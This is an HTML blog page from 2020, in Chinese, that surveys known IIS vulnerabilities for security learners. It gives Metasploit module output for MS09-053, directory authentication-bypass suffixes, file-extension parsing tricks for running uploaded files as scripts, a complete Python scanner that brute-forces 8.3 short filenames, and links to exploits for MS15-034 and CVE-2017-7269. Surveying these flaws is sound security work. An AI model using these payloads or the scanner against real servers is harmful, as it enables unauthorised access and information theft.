@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>IIS漏洞 | lazycat</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="IIS漏洞" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="[toc]" />
+<meta property="og:description" content="[toc]" />
+<link rel="canonical" href="http://localhost:4000/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/" />
+<meta property="og:url" content="http://localhost:4000/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/" />
+<meta property="og:site_name" content="lazycat" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-26T00:00:00-04:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/","headline":"IIS漏洞","dateModified":"2020-07-26T00:00:00-04:00","datePublished":"2020-07-26T00:00:00-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/"},"description":"[toc]","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+  
+  <meta
+  name="viewport"
+  content="width=device-width, initial-scale=1.0, maximum-scale=1"
+/>
+<meta
+  http-equiv="content-type"
+  content="text/html; charset=utf-8"
+/>
+<link
+  rel="alternate"
+  href="/feed.xml"
+  title="RSS"
+  type="application/rss+xml"
+/>
+
+  
+  <link
+  rel="apple-touch-icon-precomposed"
+  href="https://pic.cr173.com/up/2017-8/2017841818322084.jpg"
+/>
+<link
+  rel="shortcut
+  icon"
+  href="https://pic.cr173.com/up/2017-8/2017841818322084.jpg"
+/>
+
+  
+  <link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/combine/gh/poole/lanyon@v1.1.0/public/css/poole.min.css,gh/poole/lanyon@v1.1.0/public/css/lanyon.min.css"
+/>
+
+  
+  <link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"
+/>
+
+  
+  <link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/gh/Dreamer-Paul/Pio@2.4/static/pio.min.css"
+/>
+<script
+  async="async"
+  src="https://cdn.jsdelivr.net/combine/gh/Dreamer-Paul/Pio@2.4/static/l2d.min.js,gh/Dreamer-Paul/Pio@2.4/static/pio.min.js"
+  onload='
+      let pio_container = document.createElement("div");
+      pio_container.classList.add("pio-container");
+      pio_container.classList.add("right");
+      pio_container.style.bottom = "-2rem";
+      pio_container.style.zIndex = "1";
+      document.body.insertAdjacentElement("beforeend", pio_container);
+      let pio_action = document.createElement("div");
+      pio_action.classList.add("pio-action");
+      pio_container.insertAdjacentElement("beforeend", pio_action);
+      let pio_canvas = document.createElement("canvas");
+      pio_canvas.id = "pio";
+      pio_canvas.style.width = "14rem";
+      pio_canvas.width = "600";
+      pio_canvas.height = "800";
+      pio_container.insertAdjacentElement("beforeend", pio_canvas);
+      let pio = new Paul_Pio({
+        "mode": "fixed",
+        "hidden": true,
+        "night": "for(let i=7; i<16; ++i) if(document.body.classList.contains(`theme-base-0`+i.toString(16))) { document.body.classList.remove(`theme-base-0`+i.toString(16)); document.body.classList.add(`theme-base-0`+((i-6)%9+7).toString(16)); break; }",
+        "content": {
+          "link": ["https://jekyll-theme-WuK.wu-kan.cn"],
+          "skin": ["要换成我的朋友吗？", "让她放个假吧~"],
+          "hidden": true,
+          "custom": [{
+            "selector": "a",
+            "type": "link",
+          }, {
+            "selector": ".sidebar-toggle",
+            "text": "打开侧边栏叭~"
+          }, {
+            "selector": ".effect-info",
+            "text": "哇，你发现了什么！"
+          }, {
+            "selector": "#sidebar-search-input",
+            "text": "想搜索什么呢？很多干货哦！"
+          }, {
+            "selector": "#toc",
+            "text": "这是目录~"
+          }, {
+            "selector": ".page-title",
+            "text": "这是标题~"
+          }, {
+            "selector": ".v",
+            "text": "评论没有审核，要对自己的发言负责哦~"
+          }]
+        },
+        "model": [
+          "https:\/\/cdn.jsdelivr.net/gh/imuncle/live2d/model/33/model.2018.bls-winter.json",
+          "https:\/\/cdn.jsdelivr.net/gh/imuncle/live2d/model/platelet-2/model.json",
+          "https:\/\/cdn.jsdelivr.net/gh/imuncle/live2d/model/xiaomai/xiaomai.model.json",
+          "https:\/\/cdn.jsdelivr.net/gh/imuncle/live2d/model/mashiro/seifuku.model.json",
+          "https:\/\/cdn.jsdelivr.net/gh/imuncle/live2d/model/Violet/14.json",
+          "https:\/\/cdn.jsdelivr.net/gh/xiaoski/live2d_models_collection/Kobayaxi/Kobayaxi.model.json",
+          "https:\/\/cdn.jsdelivr.net/gh/xiaoski/live2d_models_collection/mikoto/mikoto.model.json",
+          "https:\/\/cdn.jsdelivr.net/gh/xiaoski/live2d_models_collection/uiharu/uiharu.model.json"]
+      });'
+></script>
+
+  
+  <script
+  src='https://zz.bdstatic.com/linksubmit/push.js'
+  async="async"
+></script>
+
+  
+  <script
+  async="async"
+  src="https://www.googletagmanager.com/gtag/js?id=UA-163543967-1"
+  onload="
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-163543967-1');"
+></script>
+
+  
+  <style>
+  .wrap {
+    transition-property: width,background-size,transform;
+    transition-duration: .3s;
+    transition-timing-function: ease-in-out;
+    min-height: 100%;
+    display: inline-block;
+    background-size: 100% auto;
+    background-position: 0% 0%;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    background-image: url(http://img.mp.sohu.com/upload/20170801/1eefea1125e6414d8af68aa91920cdf5_th.png);
+  }
+  @media (min-aspect-ratio: 2400/1850) {
+    .wrap {
+      background-image: url(http://img.mp.sohu.com/upload/20170801/1eefea1125e6414d8af68aa91920cdf5_th.png);
+    }
+  }
+  .sidebar-overlay #sidebar-checkbox:checked ~ .wrap {
+    width: calc(100% - 14rem);
+    background-size: calc(100% - 14rem) auto;
+    transform: translateX(14rem);
+  }
+  .layout-reverse.sidebar-overlay #sidebar-checkbox:checked ~ .wrap {
+    transform: translateX(0);
+  }
+</style>
+
+  
+  <style>
+  .sidebar,
+  html,
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: PingFang SC, Menlo, Monaco, "Courier New", Microsoft JhengHei, monospace;
+  }
+</style>
+
+  
+  <style>
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-weight: bold;
+  }
+</style>
+
+  
+  <style>
+  img {
+    display: inline-block;
+    margin: 0;
+  }
+</style>
+
+  
+  <style>
+  ::-webkit-scrollbar {
+    width: 3px;
+    height: 3px;
+  }
+  ::-webkit-scrollbar-thumb {
+    background-image: linear-gradient(45deg, Cyan 0%, Magenta 50%, Yellow 100%);
+  }
+</style>
+
+  
+  <style>
+  ::selection {
+    color: White;
+    background: Black;
+  }
+</style>
+
+  
+</head>
+
+<body
+  class="theme-base-07 sidebar-overlay">
+  
+  
+  
+  <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
+     styles, `#sidebar-checkbox` for behavior. -->
+  <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox"
+     />
+  <!-- Toggleable sidebar -->
+  <div class="sidebar" id="sidebar">
+    
+    <div class="sidebar-item">
+      <div class="effect effect-right_to_left">
+        <img class="effect-img" src="https://pic.cr173.com/up/2017-8/2017841818322084.jpg" alt="img" />
+        <div class="effect-info">
+          lazycat<br/>
+<a href="mailto:verylazycat@outlook.com">
+  <i class="fas fa-envelope"></i>
+</a>
+<a href="https://github.com/verylazycat">
+  <i class="fab fa-github"></i>
+</a>
+
+        </div>
+      </div>
+    </div>
+    
+    <nav class="sidebar-nav">
+      
+      <a class="sidebar-nav-item" href="/">
+        <i class="fas fa-home fa-fw"></i> 首页
+      </a>
+      
+      <a class="sidebar-nav-item" href="/comments/">
+        <i class="fas fa-comments fa-fw"></i> 留言
+      </a>
+      
+      <a class="sidebar-nav-item" href="/tags/">
+        <i class="fas fa-tags fa-fw"></i> 标签
+      </a>
+      
+      <a class="sidebar-nav-item" href="/archive/">
+        <i class="fas fa-archive fa-fw"></i> 归档
+      </a>
+      
+      <a class="sidebar-nav-item" href="/merger/">
+        <i class="fas fa-coffee fa-fw"></i> 打赏
+      </a>
+      
+    </nav>
+    <div class="sidebar-item">
+      
+      <style>
+  #sidebar-search-input {
+    background: none;
+    border: none;
+    color: White;
+    width: 100%;
+  }
+  #sidebar-search-results-container {
+    overflow: auto auto;
+    max-height: 50vh;
+  }
+</style>
+<input
+  id="sidebar-search-input"
+  placeholder="搜索博文"
+/>
+<ol
+  id="sidebar-search-results-container"
+></ol>
+<script
+  src='https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.7/dest/simple-jekyll-search.min.js'
+  async='async'
+  onload='
+    SimpleJekyllSearch({
+      json: "/assets/simple-jekyll-search/search.json",
+      searchInput: document.getElementById("sidebar-search-input"),
+      resultsContainer: document.getElementById("sidebar-search-results-container"),
+      searchResultTemplate: `<li><a href="{url}">{title}</a></li>`,
+      limit: 999,
+      fuzzy: true
+    })'
+></script>
+
+      
+      
+      <style>
+  #toc {
+    overflow: auto auto;
+    max-height: 50vh;
+  }
+</style>
+
+      <ol id="toc">
+  <li><a href="#iis">IIS</a></li>
+  <li><a href="#ms09-053cve-2009-3023">MS09-053/CVE-2009-3023</a></li>
+  <li><a href="#%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87">认证绕过</a></li>
+  <li><a href="#%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%B3%84%E9%9C%B2">短文件名泄露</a></li>
+  <li><a href="#put%E6%BC%8F%E6%B4%9E">PUT漏洞</a></li>
+  <li><a href="#ms15-034cve-2015-1635">MS15-034/CVE-2015-1635</a></li>
+  <li><a href="#cve-2017-7269">CVE-2017-7269</a></li>
+  <li><a href="#iis%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">IIS解析漏洞</a></li>
+</ol>
+      
+      
+      <style>
+  .sidebar-checkbox {
+    display: none;
+  }
+  .sidebar-toggle {
+    position: fixed;
+  }
+</style>
+
+      
+      <style>
+  .effect {
+    margin: 1rem;
+    perspective: 900px;
+  }
+  .effect-info {
+    text-align: center;
+    backface-visibility: hidden;
+    position: absolute;
+    top: 0;
+    transform-style: preserve-3d;
+  }
+  .effect-img {
+    z-index: 11;
+    width: 100%;
+    height: 100%;
+    position: relative;
+    transition: all 0.5s ease-in-out;
+  }
+  .effect-img:before {
+    position: absolute;
+    display: block;
+  }
+  .effect-right_to_left .effect-img {
+    transform-origin: 0% 50%;
+  }
+  .effect-right_to_left:hover .effect-img {
+    transform: rotate3d(0, 1, 0, -180deg);
+  }
+</style>
+
+      
+      <div>
+  <i class="fas fa-cog fa-spin fa-fw"></i>
+  <span id="run_time_day">
+    <i class="fas fa-spinner fa-pulse"></i>
+  </span>天
+  <span id="run_time_hour">
+    <i class="fas fa-spinner fa-pulse"></i>
+  </span>时
+  <span id="run_time_minute">
+    <i class="fas fa-spinner fa-pulse"></i>
+  </span>分
+  <span id="run_time_second">
+    <i class="fas fa-spinner fa-pulse"></i>
+  </span>秒
+  <script>
+    setInterval(function (d,h,m,s,b) {
+      function setzero(i) {
+        return i < 10 ? "0" + i : i;
+      }
+      let BirthDay = new Date(b);
+      let today = new Date();
+      let timeold = (today.getTime() - BirthDay.getTime());
+      let sectimeold = timeold / 1000;
+      let secondsold = Math.floor(sectimeold);
+      let msPerDay = 24 * 60 * 60 * 1000;
+      let e_daysold = timeold / msPerDay;
+      let daysold = Math.floor(e_daysold);
+      let e_hrsold = (e_daysold - daysold) * 24;
+      let hrsold = Math.floor(e_hrsold);
+      let e_minsold = (e_hrsold - hrsold) * 60;
+      let minsold = Math.floor((e_hrsold - hrsold) * 60);
+      let seconds = Math.floor((e_minsold - minsold) * 60);
+      d.textContent = daysold;
+      h.textContent = setzero(hrsold);
+      m.textContent = setzero(minsold);
+      s.textContent = setzero(seconds);
+    },
+    1000,
+    document.getElementById("run_time_day"),
+    document.getElementById("run_time_hour"),
+    document.getElementById("run_time_minute"),
+    document.getElementById("run_time_second"),
+    "05/02/2020 11:03:56")// 这是我第一篇博客的时间
+  </script>
+</div>
+
+      
+      <div>
+  <div>
+    <i class="fas fa-eye fa-fw"></i>
+    <span id="busuanzi_value_page_pv">
+      <i class="fas fa-spinner fa-pulse"></i>
+    </span>次
+  </div>
+  <div>
+    <i class="fas fa-paw fa-fw"></i>
+    <span id="busuanzi_value_site_pv">
+      <i class="fas fa-spinner fa-pulse"></i>
+    </span>枚
+  </div>
+  <div>
+    <i class="fas fa-user-friends fa-fw"></i>
+    <span id="busuanzi_value_site_uv">
+      <i class="fas fa-spinner fa-pulse"></i>
+    </span>人
+  </div>
+  <script
+    src='https://cdn.jsdelivr.net/npm/busuanzi@2.3.0'
+    async='async'
+  ></script>
+</div>
+
+      
+      <div>
+  <i class="fas fa-copyright fa-fw"></i>
+  2020-2022 lazycat
+</div>
+
+      
+      <div>
+  <i class="fas fa-info-circle fa-fw"></i>
+  <a href="http://beian.miit.gov.cn">
+    蜀ICP备20011774号
+  </a>
+</div>
+
+      
+      
+    </div>
+  </div>
+  <!-- Wrap is the content to shift when toggling the sidebar. We wrap the content to avoid any CSS collisions with our real content. -->
+  
+  <div class="wrap">
+    
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
+/>
+<script
+  src="https://cdn.jsdelivr.net/combine/npm/katex@0.11.1/dist/katex.min.js,npm/katex@0.11.1/dist/contrib/mathtex-script-type.min.js,npm/katex@0.11.1/dist/contrib/auto-render.min.js"
+  defer="defer"
+  onload='renderMathInElement(document.body, { delimiters: [{ left: "$", right: "$", display: false }] })'
+></script>
+
+
+
+<style>
+  pre.language-mermaid,
+  code.language-mermaid {
+    display: none;
+  }
+</style>
+<script
+  src="https://cdn.jsdelivr.net/npm/mermaid@8.5.1/dist/mermaid.min.js"
+  defer="defer"
+  onload='
+    for(let x of document.getElementsByClassName("language-mermaid"))
+      if(x.nodeName=="CODE")
+      {
+        let m = document.createElement("div");
+        m.classList.add("mermaid");
+        m.textContent = x.textContent;
+        x.parentNode.insertAdjacentElement("beforebegin", m);
+      }'
+></script>
+
+
+
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/combine/npm/prismjs@1.20.0/plugins/line-numbers/prism-line-numbers.min.css,npm/prismjs@1.20.0/plugins/toolbar/prism-toolbar.min.css,gh/PrismJS/prism-themes@1955cfef6953b3a59e66016e8a1e016b45d6cc79/themes/prism-nord.min.css"
+/>
+<script
+  src="https://cdn.jsdelivr.net/combine/npm/prismjs@1.20.0/components/prism-core.min.js,npm/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js,npm/prismjs@1.20.0/plugins/line-numbers/prism-line-numbers.min.js,npm/prismjs@1.20.0/plugins/toolbar/prism-toolbar.min.js"
+  defer="defer"
+  onload='
+    Prism.plugins.autoloader.languages_path = "https:\/\/cdn.jsdelivr.net/npm/prismjs/components/";
+    for(let x of document.getElementsByTagName("pre"))
+      x.classList.add("line-numbers");
+    Prism.plugins.toolbar.registerButton("select-code", function (env) {
+      let button = document.createElement("button");
+      button.textContent = "select this " + env.language;
+      button.addEventListener("click", function () {
+        if (document.body.createTextRange) {
+          let range = document.body.createTextRange();
+          range.moveToElementText(env.element);
+          range.select();
+        } else if (window.getSelection) {
+          let selection = window.getSelection();
+          let range = document.createRange();
+          range.selectNodeContents(env.element);
+          selection.removeAllRanges();
+            selection.addRange(range);
+        }
+      });
+      return button;
+    })'
+></script>
+
+
+
+<style>
+  pre {
+    max-height: 50vh;
+    overflow: auto;
+  }
+</style>
+
+
+<style>
+  @media (min-width: 56em) {
+    .container {
+      max-width: 66.6%;
+    }
+  }
+</style>
+
+
+<style>
+  .masthead,
+  .container.content {
+    padding-top: 1rem;
+    padding-bottom: 1rem;
+    box-shadow: 0 0 .75rem rgba(0, 0, 0, 0.1);
+    background-color: rgba(255, 255, 255, 0.95);
+    animation-duration: 2s;
+    animation-name: fadeIn;
+  }
+  @keyframes fadeIn {
+    from {
+      opacity: 0;
+    }
+    to {
+      opacity: 1;
+    }
+  }
+</style>
+
+
+
+<div class="masthead">
+  <h3 class="container masthead-title">
+    
+    IIS漏洞
+    <a href="/" title="Home">
+      <small>
+        lazycat
+      </small>
+    </a>
+    
+  </h3>
+</div>
+
+<div class="container content">
+  <div class="post">
+  <span class="post-date">
+    
+    <i class="fas fa-calendar-day fa-fw"></i>
+    26 Jul 2020
+    
+    
+    <i class="fas fa-file-word fa-fw"></i>
+    5239字
+    
+    
+    <i class="fas fa-clock fa-fw"></i>
+    18分
+    
+    
+    <span class="leancloud-visitors" id="/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/" data-xid="/_posts/2020-07-26-IIS%E6%BC%8F%E6%B4%9E/" data-flag-title="IIS漏洞">
+      <i class="fas fa-book-reader fa-fw"></i>
+      <span class="leancloud-visitors-count">
+        <i class="fas fa-spinner fa-pulse"></i>
+      </span>次
+    </span>
+    
+    
+    
+    <i class="fas fa-tag fa-fw"></i>
+    安全
+    
+    
+    <br/>
+<i class="fas fa-coffee fa-fw"></i>
+<a href="/merger/">如果这篇博客帮助到你，可以请我喝一杯咖啡~</a>
+<br/>
+<i class="fab fa-creative-commons-by fa-fw"></i>
+<a
+  href="https://creativecommons.org/licenses/by/4.0/deed.zh"
+  rel="license">
+  CC BY 4.0
+</a>
+（除特别声明或转载文章外）
+
+    
+  </span>
+  <p>[toc]</p>
+
+<h1 id="iis">IIS</h1>
+
+<p>IIS是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。</p>
+
+<p>其是一种web服务组件，其中包括WEB服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。</p>
+
+<p>目前,IIS一共发行了12个版本，从IIS1.0到IIS10.0,web市场上主要以IIS5.0到IIS10.0为主。</p>
+
+<p>对于IIS漏洞主要分布在缓冲区溢出、认证绕过、DOS拒绝服务、代码执行和信息泄露</p>
+
+<h1 id="ms09-053cve-2009-3023">MS09-053/CVE-2009-3023</h1>
+
+<p>Microsoft-IIS-FTPd服务MLST命令栈缓冲区溢出漏洞</p>
+
+<p>影响版本：IIS5.5、IIS5.1、IIS6.0</p>
+
+<p>漏洞详情：IIS内嵌的FTP服务器中存在栈溢出漏洞，如果远程攻击者对带有特制名称的目录发布了包含有通配符的FTP<code>NLST</code>(name list)命令即可触发该溢出，导致拒绝服务或执行任意代码</p>
+
+<pre><code class="language-bash">msf5 &gt; search ms09-053
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank    Check  Description
+   -  ----                                           ---------------  ----    -----  -----------
+   0  auxiliary/dos/windows/ftp/iis_list_exhaustion  2009-09-03       normal  No     Microsoft IIS FTP Server LIST Stack Exhaustion
+   1  exploit/windows/ftp/ms09_053_ftpd_nlst         2009-08-31       great   No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
+Interact with a module by name or index, for example use 1 or use exploit/windows/ftp/ms09_053_ftpd_nlst
+</code></pre>
+
+<p>条件：拥有写权限</p>
+
+<p>修补：修改NTFS文件权限或修改不允许FTP写权限或不允许FTP匿名登录或安装补丁</p>
+
+<h1 id="认证绕过">认证绕过</h1>
+
+<p>影响版本：IIS6.0、IIS7.5</p>
+
+<p>漏洞详情：对用户输入未经正确验证，攻击者可利用漏洞构造特殊数据，在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问</p>
+
+<p>攻击手段：</p>
+
+<p>IIS6.0</p>
+
+<p>将<code>::$INDEX_ALLOCATION</code>后缀添加到目录名称后，如<code>/admin::$INDEX_ALLOCATION/index.php</code></p>
+
+<p>IIS7.5</p>
+
+<p>将<code>:$i30:$INDEX_ALLOCATION</code>后缀添加到目录名称后，如<code>/admin:$i30:$INDEX_ALLOCATION/index.asp</code></p>
+
+<h1 id="短文件名泄露">短文件名泄露</h1>
+
+<p>影响版本：IIS5.0-IIS10.0</p>
+
+<p>漏洞详情：Windows支持以8.3格式生成与MS-DOS兼容的（短）文件名，以允许基于MS-DOS或16位Windows的程序访问这些文件。基于Windows的IIS服务器默认根目录C:\inetpub\wwwroot下的网页脚本文件和目录符合一定条件时，会生成相应的短文件名。此时，攻击者利用HTTP的DEBUG、OPTIONS、GET、POST、HEAD、TRACE等方法携带波浪号，可以对IIS服务器短文件名进行暴力猜解，依据返回的页面信息和状态码来确认真实存在的文件名，从而获取服务器敏感信息。</p>
+
+<p>检测脚本:</p>
+
+<pre><code class="language-python">import sys
+import httplib
+import urlparse
+import threading
+import Queue
+import time
+
+
+class Scanner():
+    def __init__(self, target):
+        self.target = target.lower()
+        if not self.target.startswith('http'):
+            self.target = 'http://%s' % self.target
+        self.scheme, self.netloc, self.path, params, query, fragment = \
+                     urlparse.urlparse(target)
+        if self.path[-1:] != '/':    # ends with slash
+            self.path += '/'
+        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
+        self.files = []
+        self.dirs = []
+        self.queue = Queue.Queue()
+        self.lock = threading.Lock()
+        self.threads = []
+        self.request_method = ''
+        self.msg_queue = Queue.Queue()
+        self.STOP_ME = False
+        threading.Thread(target=self._print).start()
+
+    def _conn(self):
+        try:
+            if self.scheme == 'https':
+                conn = httplib.HTTPSConnection(self.netloc)
+            else:
+                conn = httplib.HTTPConnection(self.netloc)
+            return conn
+        except Exception, e:
+            print '[_conn.Exception]', e
+            return None
+
+    def _get_status(self, path):
+        try:
+            conn = self._conn()
+            conn.request(self.request_method, path)
+            status = conn.getresponse().status
+            conn.close()
+            return status
+        except Exception, e:
+            raise Exception('[_get_status.Exception] %s' % str(e) )
+
+    def is_vul(self):
+        try:
+            for _method in ['GET', 'OPTIONS']:
+                self.request_method = _method
+                status_1 = self._get_status(self.path + '/*~1*/a.aspx')    # an existed file/folder
+                status_2 = self._get_status(self.path + '/l1j1e*~1*/a.aspx')    # not existed file/folder
+                if status_1 == 404 and status_2 != 404:
+                    return True
+            return  False
+        except Exception, e:
+            raise Exception('[is_vul.Exception] %s' % str(e) )
+
+    def run(self):
+        for c in self.alphanum:
+            self.queue.put( (self.path + c, '.*') )    # filename, extension
+        for i in range(20):
+            t = threading.Thread(target=self._scan_worker)
+            self.threads.append(t)
+            t.start()
+        for t in self.threads:
+            t.join()
+        self.STOP_ME = True
+
+    def report(self):
+        print '-'* 64
+        for d in self.dirs:
+            print 'Dir:  %s' % d
+        for f in self.files:
+            print 'File: %s' % f
+        print '-'*64
+        print '%d Directories, %d Files found in total' % (len(self.dirs), len(self.files))
+        print 'Note that * is a wildcard, matches any character zero or more times.'
+
+    def _print(self):
+        while not self.STOP_ME or (not self.msg_queue.empty()):
+            if self.msg_queue.empty():
+                time.sleep(0.05)
+            else:
+                print self.msg_queue.get()
+
+    def _scan_worker(self):
+        while True:
+            try:
+                url, ext = self.queue.get(timeout=1.0)
+                status = self._get_status(url + '*~1' + ext + '/1.aspx')
+                if status == 404:
+                    self.msg_queue.put('[+] %s~1%s\t[scan in progress]' % (url, ext))
+
+                    if len(url) - len(self.path)&lt; 6:    # enum first 6 chars only
+                        for c in self.alphanum:
+                            self.queue.put( (url + c, ext) )
+                    else:
+                        if ext == '.*':
+                            self.queue.put( (url, '') )
+
+                        if ext == '':
+                            self.dirs.append(url + '~1')
+                            self.msg_queue.put('[+] Directory ' +  url + '~1\t[Done]')
+
+                        elif len(ext) == 5 or (not ext.endswith('*')):    # .asp*
+                            self.files.append(url + '~1' + ext)
+                            self.msg_queue.put('[+] File ' + url + '~1' + ext + '\t[Done]')
+
+                        else:
+                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
+                                self.queue.put( (url, ext[:-1] + c + '*') )
+                                if len(ext) &lt; 4:    # &lt; len('.as*')
+                                    self.queue.put( (url, ext[:-1] + c) )
+
+            except Queue.Empty,e:
+                break
+            except Exception, e:
+                print '[Exception]', e
+
+
+if __name__ == '__main__':
+    if len(sys.argv) == 1:
+        print 'Usage: python IIS_shortname_Scan.py http://www.target.com/'
+        sys.exit()
+
+    target = sys.argv[1]
+    s = Scanner(target)
+    if not s.is_vul():
+        s.STOP_ME = True
+        print 'Server is not vulnerable'
+        sys.exit(0)
+
+    print 'Server is vulnerable, please wait, scanning...'
+    s.run()
+    s.report()
+</code></pre>
+
+<h1 id="put漏洞">PUT漏洞</h1>
+
+<p>漏洞详情：对IIS的错误配置导致的写权限漏洞。WEB服务器拓展里设置了<code>WebDAV</code>为允许，同时网站权限配置开启了写入权限与脚本资源访问权限。通过该PUT漏洞可以写入webshell</p>
+
+<p>方法:</p>
+
+<p>https://www.codercto.com/a/48257.html</p>
+
+<h1 id="ms15-034cve-2015-1635">MS15-034/CVE-2015-1635</h1>
+
+<p>漏洞详情： 远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
+
+<p>攻击手段： https://www.freebuf.com/articles/system/64185.html</p>
+
+<h1 id="cve-2017-7269">CVE-2017-7269</h1>
+
+<p>IIS远程代码执行漏洞</p>
+
+<p>影响版本：IIS6.0</p>
+
+<p>漏洞详情：开启<code>WebDAV</code>服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用。</p>
+
+<p>攻击手段： https://github.com/zcgonvh/cve-2017-7269</p>
+
+<h1 id="iis解析漏洞">IIS解析漏洞</h1>
+
+<p>影响版本：IIS5.0-6.0、IIS7.0</p>
+
+<p>漏洞详情：</p>
+
+<p>1、IIS5.0-6.0下，如果一个目录以”xxx.asp”的形式命名，那么该目录下的所有类型文件都会被当做asp文件来进行解析执行</p>
+
+<p>2、IIS5.0-6.0下，如果一个文件的扩展名采用”.asp;*.jpg”的形式，那么该文件也会被当做asp文件解析执行</p>
+
+<p>3、IIS70下，如果php.ini中的cgi.cgi_pathinfo=1同时IIS7.0在Fast-CGI运行模式下，则可以在恶意文件后面添加<code>/.php</code>使得其解析为php。如<code>http://192.168.61.141/789.jpg/.php</code></p>
+
+<p>参考链接：</p>
+
+<p>https://www.cnblogs.com/baifan2618/p/7704678.html</p>
+
+<p>https://blog.csdn.net/nzjdsds/article/details/96989492</p>
+
+</div>
+<div class="v">
+  <i class="fas fa-spinner fa-pulse"></i>
+</div>
+<script
+  src='https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js'
+  defer='defer'
+  onload='
+    new Valine({
+      "el": document.getElementsByClassName("v")[0],
+      "appId": "9hABRddSuEkTgqLrt1VSK5B1-gzGzoHsz",
+      "appKey": "NJ7RwmgrxsF7KDzlqU7YewlL",
+      "placeholder": "在这里评论吧！填写邮箱可以获得 Gravatar 头像和回复通知哦",
+      "requiredFields": ["nick","mail"],
+      "visitor": true,
+      "recordIP": true
+    })'
+></script>
+
+</div>
+  </div>
+  
+  <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+  
+</body>
+
+</html>
